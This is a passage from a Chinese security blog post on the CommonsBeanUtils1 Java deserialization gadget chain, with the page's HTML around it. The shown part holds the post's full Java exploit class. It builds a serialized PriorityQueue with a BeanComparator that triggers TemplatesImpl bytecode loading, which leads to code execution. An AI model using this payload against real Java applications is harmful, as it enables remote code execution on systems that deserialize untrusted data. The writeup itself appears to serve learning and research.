com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        beanComparator.compare(templates,templates);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                CommonsBeanUtils1
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/03/19/CommonsBeanUtils1/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-03-19 08:25</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/03/22/mysql%20JDBC/"
+                                   title="mysql JDBC学习"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">mysql JDBC学习</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/03/03/Apache%20HugeGraph%20JWT%20Token%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-43441)/"
+                                   title="Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsBeanUtils%E4%BB%8B%E7%BB%8D"><span class="nav-text">CommonsBeanUtils介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#javaBean%E4%BB%8B%E7%BB%8D"><span class="nav-text">javaBean介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CommonsBeanUtils%E8%BF%9B%E8%A1%8C%E8%B0%83%E7%94%A8javaBean%E4%BA%8B%E4%BE%8B%E5%8F%8A%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-text">使用CommonsBeanUtils进行调用javaBean事例及源码调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%BE%E9%83%A8"><span class="nav-text">尾部</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%B8%8E%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86"><span class="nav-text">中间与前半部分</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsBeanUtils%E4%BB%8B%E7%BB%8D"><span class="nav-text">CommonsBeanUtils介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#javaBean%E4%BB%8B%E7%BB%8D"><span class="nav-text">javaBean介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CommonsBeanUtils%E8%BF%9B%E8%A1%8C%E8%B0%83%E7%94%A8javaBean%E4%BA%8B%E4%BE%8B%E5%8F%8A%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-text">使用CommonsBeanUtils进行调用javaBean事例及源码调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%BE%E9%83%A8"><span class="nav-text">尾部</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%B8%8E%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86"><span class="nav-text">中间与前半部分</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
